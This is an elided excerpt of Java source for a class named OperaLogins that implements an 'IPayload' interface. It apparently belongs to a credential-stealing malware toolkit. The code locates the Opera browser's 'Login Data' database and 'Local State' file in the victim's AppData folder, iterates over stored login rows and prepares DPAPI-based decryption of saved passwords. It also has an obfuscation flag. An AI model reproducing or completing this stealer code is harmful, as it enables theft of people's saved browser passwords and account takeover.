...
public class OperaLogins implements IPayload
{
    ...
    public static ArrayList<String> getBraveInfo() {
        ...
        try {
            ...
            for (final File file : FileUtil.getFiles("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable")) {
                if (file.getName().contains("Login Data")) {
                    ...
                    while (rs != null && rs.next()) {
                        ...
                        else if (url.length() > 40 && OperaLogins.shorten) {
        ...
        try {
            ...
            if (WinDPAPI.isPlatformSupported()) {
                ...
                if (!isV10) {
                    ...
                    if (StringUtils.isEmpty((CharSequence)OperaLogins.localStateFileFullPathAndName)) {
                        throw new IllegalArgumentException("Local State is required");
                    }
                    final String localState = FileUtils.readFileToString(new File(OperaLogins.localStateFileFullPathAndName));
    ...
    static {
        localStateFileFullPathAndName = "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State";
        OperaLogins.shorten = true;
        OperaLogins.obfus = false;
    }
}
